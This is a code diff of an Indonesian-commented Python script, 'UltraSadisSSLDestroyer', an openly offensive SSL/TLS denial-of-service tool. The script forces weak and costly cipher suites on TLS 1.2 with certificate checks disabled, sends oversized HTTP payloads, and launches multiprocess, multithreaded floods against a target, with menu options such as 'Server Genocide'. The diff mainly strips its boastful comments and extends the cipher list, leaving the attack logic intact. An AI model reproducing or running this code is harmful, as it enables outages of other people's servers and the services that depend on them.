@@ -1,10 +1,3 @@
-#!/usr/bin/env python3
-"""
-ðŸ’€ðŸ’€ðŸ’€ ULTRA SADIS SSL SERVER DESTROYER ðŸ’€ðŸ’€ðŸ’€
-Level kehancuran: SEMUT DITIMPA BIG BANG
-WARNING: INI BENER-BENER BISA BUNUH SERVER DALAM 30 DETIK!
-"""
-
 import ssl
 import socket
 import threading
@@ -36,16 +29,42 @@ class UltraSadisSSLDestroyer:
             'PSK-3DES-EDE-CBC-SHA',
             'SRP-DSS-3DES-EDE-CBC-SHA',
             'SRP-RSA-3DES-EDE-CBC-SHA',
-            
-            # Camellia 256 - Beast mode
+           
             'ECDHE-RSA-CAMELLIA256-CBC-SHA384',
             'ECDHE-ECDSA-CAMELLIA256-CBC-SHA384',
             'DHE-RSA-CAMELLIA256-CBC-SHA256',
             'DHE-DSS-CAMELLIA256-CBC-SHA256',
             'CAMELLIA256-CBC-SHA256',
-            'PSK-CAMELLIA256-CBC-SHA384',
-            
-            # ARIA - Korean death machine
+            'DES-CBC3-SHA',
+'ECDHE-RSA-DES-CBC3-SHA',
+'ECDHE-ECDSA-DES-CBC3-SHA',
+'DHE-RSA-DES-CBC3-SHA',
+'DHE-DSS-DES-CBC3-SHA',
+'PSK-3DES-EDE-CBC-SHA',
+'SRP-DSS-3DES-EDE-CBC-SHA',
+'SRP-RSA-3DES-EDE-CBC-SHA',
+'AES256-SHA',
+'AES128-SHA',
+'DHE-RSA-AES256-SHA',
+'DHE-RSA-AES128-SHA',
+'ECDHE-RSA-AES256-SHA',
+'ECDHE-RSA-AES128-SHA',
+'ECDHE-ECDSA-AES256-SHA',
+'ECDHE-ECDSA-AES128-SHA',
+'CAMELLIA256-SHA',
+'CAMELLIA128-SHA',
+'DHE-RSA-CAMELLIA256-SHA',
+'DHE-RSA-CAMELLIA128-SHA',
+'SEED-SHA',
+'IDEA-CBC-SHA',
+'RC4-SHA',
+'RC4-MD5',
+'EXP-RC4-MD5',
+'EXP-DES-CBC-SHA',
+'EXP-EDH-RSA-DES-CBC-SHA',
+'EXP-EDH-DSS-DES-CBC-SHA',
+'NULL-MD5',
+'NULL-SHA',
             'ECDHE-RSA-ARIA256-CBC-SHA384',
             'ECDHE-ECDSA-ARIA256-CBC-SHA384',
             'DHE-RSA-ARIA256-CBC-SHA384',
@@ -64,28 +83,25 @@ class UltraSadisSSLDestroyer:
             'RC4-64-MD5',
         ]
         
-        # ðŸŒ‹ ULTIMATE DEATH COMBO - MULTIVERSE DESTROYER ðŸŒ‹
         self.multiverse_destroyers = [
-            'DES-CBC3-SHA',                    # BIG BANG LEVEL
-            'ECDHE-RSA-DES-CBC3-SHA',         # MULTIVERSE LEVEL  
-            'DHE-RSA-CAMELLIA256-CBC-SHA256', # OMNIVERSE LEVEL
-            'ECDHE-ECDSA-ARIA256-CBC-SHA384', # HYPERVERSE LEVEL
-            'PSK-3DES-EDE-CBC-SHA',           # METAVERSE LEVEL
+            'DES-CBC3-SHA',                    
+            'ECDHE-RSA-DES-CBC3-SHA',           
+            'DHE-RSA-CAMELLIA256-CBC-SHA256', 
+            'ECDHE-ECDSA-ARIA256-CBC-SHA384', 
+            'PSK-3DES-EDE-CBC-SHA',           
         ]
         
         self.attack_active = False
         self.destruction_level = 0
     
     def create_death_ssl_context(self, cipher_suite):
-        """SSL context yang dirancang untuk membunuh server"""
+        
         context = ssl.create_default_context()
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
         
-        # Force cipher mematikan
-        context.set_ciphers(cipher_suite)
+        context.set_ciphers(cipher_suite)        
         
-        # Force TLS 1.2 (lebih berat dari 1.3)
         context.minimum_version = ssl.TLSVersion.TLSv1_2
         context.maximum_version = ssl.TLSVersion.TLSv1_2
         
@@ -97,7 +113,7 @@ class UltraSadisSSLDestroyer:
         return context
     
     def ultra_sadis_payload(self, size=65536):
-        """Generate payload yang bisa bikin server nangis"""
+        
         payload = []
         
         # HTTP request yang gede banget
@@ -208,7 +224,7 @@ class UltraSadisSSLDestroyer:
             }
     
     def big_bang_attack(self, cipher_suite, processes=50, threads_per_process=20, duration=600):
-        """Attack level big bang - multiprocess + multithread"""
+        
         print(f"ðŸ’¥ðŸ’¥ðŸ’¥ BIG BANG ATTACK INITIATED ðŸ’¥ðŸ’¥ðŸ’¥")
         print(f"ðŸŒ‹ Cipher: {cipher_suite}")
         print(f"ðŸš€ Processes: {processes} | Threads per process: {threads_per_process}")
@@ -278,7 +294,7 @@ class UltraSadisSSLDestroyer:
         }
     
     def multiverse_annihilation(self):
-        """Ultimate weapon - Multiverse level annihilation"""
+        
         print("ðŸŒŒ" * 60)
         print("ðŸ’€ðŸ’€ðŸ’€ MULTIVERSE ANNIHILATION PROTOCOL ðŸ’€ðŸ’€ðŸ’€")
         print("âš ï¸  WARNING: THIS WILL DESTROY ENTIRE SERVER FARM!")
@@ -322,7 +338,6 @@ class UltraSadisSSLDestroyer:
         print("âš ï¸  IMMEDIATE TOTAL DESTRUCTION!")
         print("ðŸš¨" * 60)
         
-        # Launch ALL ciphers simultaneously
         processes = []
         
         for cipher in self.big_bang_ciphers[:10]:  # Top 10 deadliest
@@ -382,7 +397,7 @@ if __name__ == "__main__":
         print("4. Emergency Server Genocide (IMMEDIATE DEATH)")
         print("5. THE END OF EVERYTHING (ALL WEAPONS UNLEASHED)")
         
-        choice = input("\nChoose your destiny (1-5): ")
+        choice = input("\npilih proses yang kamu mau (1-5): ")
         
         if choice == "1":
             print("ðŸŽ¯ Testing single multiverse handshake...")
